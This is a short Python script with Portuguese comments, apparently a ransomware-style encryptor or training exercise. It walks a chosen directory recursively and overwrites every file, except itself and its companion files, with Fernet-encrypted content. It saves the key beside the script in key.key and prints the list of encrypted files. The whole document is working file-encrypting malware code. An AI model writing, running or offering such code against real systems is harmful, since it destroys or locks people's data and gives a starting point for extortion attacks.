from cryptography.fernet import Fernet
import os
import sys
## função apra listar todos os dados

## função para encryptografar

def enc_file(key,files):
    for file_path in files:
        with open(file_path,'rb') as bin_file:
            content=bin_file.read()
        encrypt_content= Fernet(key).encrypt(content)
        with open(file_path,'wb') as bin_file:
            bin_file.write(encrypt_content)



def list_files(base_dir):
    all_files =[]
    for entry in os.listdir(base_dir):
        full_path = os.path.abspath(os.path.join(base_dir,entry))
        if os.path.isdir(full_path):
            all_files+=list_files(full_path)
        elif os.path.isfile(full_path) and entry not in IGN_ARQ:
            all_files.append(full_path)
    return all_files
## checar se o user vai passar um caminho
## precisa manipular bem os diretorios

def main():
    global IGN_ARQ
    IGN_ARQ=[os.path.basename(__file__),'key.key','enc.py','dec.py']
    if len(sys.argv) > 1:
        dir = sys.argv[1]
    else:
        dir = 'arquivos'

    arqs = list_files(dir)
    key = Fernet.generate_key()
    with open('key.key','wb') as key_file:
        key_file.write(key)
    enc_file(key,arqs)
    if arqs:
        print("Os files foram encriptografados")
        for file in arqs:
            print(file)
    else:
        print("Nenhum arquivo encriptografado")


if __name__ == '__main__':
    main()